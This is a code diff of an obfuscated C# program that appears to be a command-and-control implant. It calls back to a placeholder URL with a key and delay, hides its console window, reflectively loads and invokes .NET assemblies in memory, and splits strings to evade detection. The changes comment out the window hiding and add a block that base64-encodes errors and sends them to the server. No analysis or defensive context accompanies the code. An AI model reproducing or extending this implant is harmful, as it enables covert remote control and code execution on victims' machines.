@@ -80,7 +80,7 @@ namespace VAR1
 
         public static void Main()
         {
-            ShowWindow(GetConsoleWindow(), 0);
+            //ShowWindow(GetConsoleWindow(), 0);
             VAR13("[URL]", "[KEY]", "[DELAY]");
         }
 
@@ -520,7 +520,7 @@ namespace VAR1
             if (VAR129 != null)
             {
                 VAR132.Append("[Ref" + "lect" + "iveD" + "otN" + "et" + "Loader] Passing args: " + String.Join(" ", VAR127) + Environment.NewLine);
-                object o = VAR128.CreateInstance(VAR129.Name);
+                object VAR12 = VAR128.CreateInstance(VAR129.Name);
                 List<string> VAR130 = new List<string>(VAR127);
                 VAR129.Invoke(null, new[] { (object[]) VAR130.ToArray()
                                 });
@@ -634,6 +634,10 @@ namespace VAR1
             {
                 VAR60 = VAR59.GetRequestStream();
                 VAR60.Write(Encoding.ASCII.GetBytes(VAR66), 0, VAR66.Length);
+            }
+            catch (Exception VAR133)
+            {
+                VAR21(Convert.ToBase64String(Encoding.UTF8.GetBytes(VAR133.Message)), VAR56);
             }
             finally
             {
